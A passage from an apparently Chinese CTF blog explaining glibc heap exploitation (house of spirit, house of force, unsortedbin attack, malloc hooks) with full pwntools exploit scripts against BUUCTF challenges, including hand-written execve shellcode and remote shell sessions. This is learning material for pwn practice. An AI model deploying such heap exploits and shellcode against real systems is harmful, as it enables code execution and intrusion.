class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;2&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">de(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">mallocadd = <span class="number">0x0000000000602032</span></span><br><span class="line">sysadd = <span class="number">0x0000000000400943</span></span><br><span class="line">create(<span class="string">b&#x27;3&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,p64(mallocadd))</span><br><span class="line">create(<span class="string">b&#x27;4&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;5&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">8</span>*<span class="string">b&#x27;d&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;6&#x27;</span>,<span class="string">b&#x27;56&#x27;</span>,<span class="number">22</span>*<span class="string">b&#x27;a&#x27;</span>+p64(sysadd))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;2 delete paper\n&quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h1><blockquote>
<p>以<a href="https://buuoj.cn/challenges#lctf2016_pwn200">lctf2016_pwn200</a>为例子</p>
</blockquote>
<h2 id="fastbin绕过思路"><a href="#fastbin绕过思路" class="headerlink" title="fastbin绕过思路"></a>fastbin绕过思路</h2><ul>
<li>chunk地址对齐，此题对应的libc貌似不用考虑，没有试过。</li>
<li>size对齐（一般以2*size_t）</li>
<li>next_size检查，本题目主要检查尺寸范围</li>
<li>具体libc具体分析，可以查看malloc.c的源码</li>
</ul>
<blockquote>
<p>此处以glibc2.35为例</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (victim))) <span class="comment">//地址对齐检查，低版本好像没有</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 2&quot;</span>);</span><br><span class="line"></span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);<span class="comment">//chunksize检查</span></span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);<span class="comment">//debug模式调试所用，不用关心</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">			malloc_printerr (<span class="string">&quot;malloc(): unaligned fastbin chunk detected 3&quot;</span>);</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h2 id="本题思路"><a href="#本题思路" class="headerlink" title="本题思路"></a>本题思路</h2><blockquote>
<p>1.利用printf的基址泄露rbp的值。</p>
<p>2.利用栈溢出来覆盖ptr的值（覆盖为rbp相关），可以利用此条件构造一个malloc_chunk（大尺寸），然后free掉再malloc达到可以更改rbp所指向的位置附近的值。而又因为rbp的bp-chain的性质，即可更改返回地址。</p>
<p>3.将返回地址更改为步骤2注入的shellcode的地址。因为步骤2可利用的空间有限，shellcode手写较好，不宜过长。</p>
<p>4.其中还有一些细节，如利用id来构造下一个chunk的size字段，绕过检查。</p>
</blockquote>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io= process(&quot;./pwn200&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27077</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">## 泄露地址</span></span><br><span class="line">io.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="number">48</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">rbp = u64(io.recvuntil(<span class="string">b&quot;,&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp con:&quot;</span>,<span class="built_in">hex</span>(rbp))</span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">## 构造id字段，利用atoi，33会被转化为0x21</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 手写shellcode，push，pop所占机器码较少</span></span><br><span class="line">binpa = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rax,59</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asm len:&quot;</span>,<span class="built_in">len</span>(binpa))</span><br><span class="line"><span class="comment">##溢出字段的构造</span></span><br><span class="line">payload = <span class="number">8</span>*<span class="string">b&#x27;\x00&#x27;</span>+binpa+<span class="number">4</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x41</span>)+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>+<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how long?\n&quot;</span>,<span class="string">b&#x27;56&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="house-of-spirit（Arbitrary-Alloc）"><a href="#house-of-spirit（Arbitrary-Alloc）" class="headerlink" title="house_of_spirit（Arbitrary Alloc）"></a>house_of_spirit（<strong>Arbitrary Alloc</strong>）</h1><blockquote>
<p>以<a href="https://buuoj.cn/challenges#babyheap_0ctf_2017">BUUCTF在线评测 (buuoj.cn)</a>为例</p>
</blockquote>
<h2 id="本题思路-1"><a href="#本题思路-1" class="headerlink" title="本题思路"></a>本题思路</h2><ul>
<li>通过unsortedbin的双向链表泄露main_arena地址，得到libc基址，再通过将malloc_hook中注入onegadget拿到shell</li>
<li>此题有明显溢出，因此可以考虑吧overslap，凭着这个思路可以泄露address</li>
<li>通过复写fd，来达到任意地址写的目的，以此来注入onegadget</li>
</ul>
<h2 id="本题py-远程打不通，可以打通本地，搞不懂为什么"><a href="#本题py-远程打不通，可以打通本地，搞不懂为什么" class="headerlink" title="本题py(远程打不通，可以打通本地，搞不懂为什么)"></a>本题py(远程打不通，可以打通本地，搞不懂为什么)</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io= process(&quot;./pwn200&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27077</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;who are u?\n&quot;</span>,<span class="number">48</span>*<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">rbp = u64(io.recvuntil(<span class="string">b&quot;,&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rbp con:&quot;</span>,<span class="built_in">hex</span>(rbp))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;33&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binpa = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">mov rax,59</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;asm len:&quot;</span>,<span class="built_in">len</span>(binpa))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = 8*b&#x27;\x00&#x27;+binpa+3*b&#x27;\x00&#x27;+p64(0x11)+0x8*b&#x27;a&#x27;+p64(0x21)+p64(rbp-144)</span></span><br><span class="line"><span class="comment">#payload =  8*b&#x27;\x00&#x27;+p64(0x21)+binpa+3*b&#x27;\x00&#x27;+p64(0x21)+0x8*b&#x27;a&#x27;+p64(rbp-176)</span></span><br><span class="line">payload = <span class="number">8</span>*<span class="string">b&#x27;\x00&#x27;</span>+binpa+<span class="number">4</span>*<span class="string">b&#x27;\x00&#x27;</span>+p64(<span class="number">0x41</span>)+<span class="number">0x8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>+<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;your choice : &quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;how long?\n&quot;</span>,<span class="string">b&#x27;56&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="number">24</span>*<span class="string">b&#x27;a&#x27;</span>+p64(rbp-<span class="number">176</span>-<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h1><blockquote>
<p>修改top的size字段使其极大，以至于达到可以任意地址分配的目的。</p>
<p>第一次分配先改变top的区域</p>
<p>第二次分配直接获得想要区域的读写权限</p>
</blockquote>
<h2 id="部分代码如下："><a href="#部分代码如下：" class="headerlink" title="部分代码如下："></a>部分代码如下：</h2><blockquote>
<p>此代码为高版本的malloc源码，低版本无：<code> if (__glibc_unlikely (size &gt; av-&gt;system_mem))</code>此判断语句，因此可以利用成功。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim = av-&gt;top;</span><br><span class="line">size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted top size&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="demo："><a href="#demo：" class="headerlink" title="demo："></a>demo：</h2><blockquote>
<p>版本glibc2.23，高版本只要加了patch很容易使此攻击失效</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">long</span> *ptr,ptr2;</span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">    ptr = (<span class="type">long</span>*)((<span class="type">long</span>)(ptr)+<span class="number">24</span>);</span><br><span class="line">    *ptr = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">-4120</span>);</span><br><span class="line">    <span class="type">void</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,p3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>需要注意的是<code>remainder = chunk_at_offset (victim, nb);</code>语句来改变top的指针指向，改编为victim+nb</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>

<p>因此可以看出当malloc（负数）的时候，会将top的指针降低到bss段，以此来达到复写bss段的目的。</p>
<figure class="highlight plaintext"><figcaption><span>*p4 </span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">## 习题：[BUUCTF在线评测 (buuoj.cn)](https://buuoj.cn/challenges#hitcontraining_bamboobox)</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from pwn import *</span><br><span class="line">io = process(&quot;./bamboobox&quot;)</span><br><span class="line">#io = remote(&quot;node5.buuoj.cn&quot;,28639)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><span class="line">#context.log_level=&#x27;debug&#x27;</span><br><span class="line">def create(size,content):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;,b&#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">    io.sendafter(&quot;Please enter the name of item:&quot;,content)</span><br><span class="line">def show():</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;1&#x27;)</span><br><span class="line">    return io.recvuntil(&quot;\n&quot;).strip()</span><br><span class="line">def change(index,size,content):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the length of item name:&quot;,size)</span><br><span class="line">    io.sendafter(&quot;Please enter the new name of the item:&quot;,content)</span><br><span class="line">def remove(index):</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;4&#x27;)</span><br><span class="line">    io.sendlineafter(&quot;Please enter the index of item:&quot;,index)</span><br><span class="line">def exit():</span><br><span class="line">    io.sendlineafter(&quot;Your choice:&quot;, b&#x27;5&#x27;)</span><br><span class="line">create(b&#x27;248&#x27;,24*b&#x27;a&#x27;)</span><br><span class="line">change(b&#x27;0&#x27;,b&#x27;256&#x27;,248*b&#x27;a&#x27;+p64(0xffffffffffffffff))</span><br><span class="line">create(b&#x27;-304&#x27;,8*b&#x27;a&#x27;)</span><br><span class="line">create(b&#x27;24&#x27;,8*b&#x27;a&#x27;+p64(0x0000000000400D49))</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">exit()</span><br><span class="line">print(io.recv())</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这道题漏洞很多，这个方法需要flag在正确路径，但是buu远程好像不在，因此需要换一种方法。</p>
<h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin_attack"></a>unsortedbin_attack</h1><h2 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h2><p>在malloc一个大块时，若unsortedbin中只有一个remindered块，那么就会进行脱链，传递给用户，当然尺寸得足够。</p>
<p>其中会执行<code>bck = victim-&gt;bk;..............;bck-&gt;fd = unsorted_chunks (av);</code>利用此可将bck+0x10所指向的位置的值变得极大。</p>
<p>但是在libc2.35中有指针检查，因此此利用方法在高版本应该会失效。具体patch为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line"><span class="comment">/*此处代码检查了bk指针的伪造，有效防止了此漏洞*/</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="例子：BUUCTF在线评测-buuoj-cn"><a href="#例子：BUUCTF在线评测-buuoj-cn" class="headerlink" title="例子：BUUCTF在线评测 (buuoj.cn)"></a>例子：<a href="https://buuoj.cn/challenges#hitcontraining_magicheap">BUUCTF在线评测 (buuoj.cn)</a></h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(<span class="string">&quot;./magicheap&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28462</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">def create(size,content):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Size of Heap : &quot;</span>,size)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line">def edit(index,size,content):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Index :&quot;</span>, index)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Size of Heap : &quot;</span>, size)</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Content of heap : &quot;</span>, content)</span><br><span class="line">def de(index):</span><br><span class="line">    io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendafter(b<span class="number">&#x27;</span>Index :<span class="string">&#x27;,index)</span></span><br><span class="line"><span class="string">def ex(index):</span></span><br><span class="line"><span class="string">    io.sendafter(b&quot;Your choice :&quot;,b&#x27;</span><span class="number">4&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;24&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;1272&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;b</span><span class="number">&#x27;</span>)</span><br><span class="line">create(b<span class="number">&#x27;24&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;</span>c<span class="number">&#x27;</span>)</span><br><span class="line">de(b<span class="number">&#x27;1&#x27;</span>)</span><br><span class="line">edit(b<span class="number">&#x27;0&#x27;</span>,b<span class="number">&#x27;48&#x27;</span>,<span class="number">24</span>*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p64(<span class="number">0x501</span>)+p64(<span class="number">0x0000000000602090</span>)+p64(<span class="number">0x0000000000602090</span>))</span><br><span class="line">create(b<span class="number">&#x27;1272&#x27;</span>,<span class="number">10</span>*b<span class="number">&#x27;e&#x27;</span>)</span><br><span class="line">io.sendafter(b<span class="string">&quot;Your choice :&quot;</span>,b<span class="number">&#x27;4869&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="meta">#gdb.attach(io)</span></span><br><span class="line"><span class="meta">#pause()</span></span><br></pre></td></tr></table></figure>



<h1 id="关于hook的一些说明"><a href="#关于hook的一些说明" class="headerlink" title="关于hook的一些说明"></a>关于hook的一些说明</h1><blockquote>
<p>当<code>__malloc_hook</code>和<code>__free_hook</code>中部位null的时候，在执行<code>__libc_free,__libc_malloc</code>会优先执行hook中的函数。</p>
</blockquote>
<p>代码可如下：glibc2.27</p>
<p><img src="/img/mypic/heap/hook.png" alt="hook"></p>
<p>但是在2.35中hook没有了，也就不存在此利用手法：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Quickly check that the freed pointer matches the tag for the memory.</span></span><br><span class="line"><span class="comment">     This gives a useful double-free detection.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (mtag_enabled))</span><br><span class="line">    *(<span class="keyword">volatile</span> <span class="type">char</span> *)mem;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> err = errno;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br></pre></td></tr></table></figure>























]]></content>
      <categories>
        <category>userpwn</category>
      </categories>
      <tags>
        <tag>userpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>POC for Houseoforange</title>
    <url>/2024/08/21/userpwn/houseoforange/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
<p>具体调用链和条件，可看：<a href="https://bbs.kanxue.com/thread-280167.htm">https://bbs.kanxue.com/thread-280167.htm</a></p>
</blockquote>
<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><blockquote>
<p>glibc2.23，无跳表检查。</p>
<p>条件：1.可溢出修改topchunk的size字段</p>
<p>2.可溢出修改已经放入到unsortedbin中的链表</p>
<p>基本思想：将iolist链表的起始地址从stdeer转换为unsortedbin的地址，则及那个unsortedbin当成stdeer，构造其chain字段，指向一个fake的io结构体，而chain字段按偏移量来算恰好为smallbin[5]，也就是装0x60-0x70的大小的chunk的bin，因此需要将top的头伪造成0x61，伪造好所有结构体之后，申请一个大的chunk（大于unsortedbin中的否则则会split），然后top则会被装入smallbin，也就是说可以实现chain指向top头。</p>
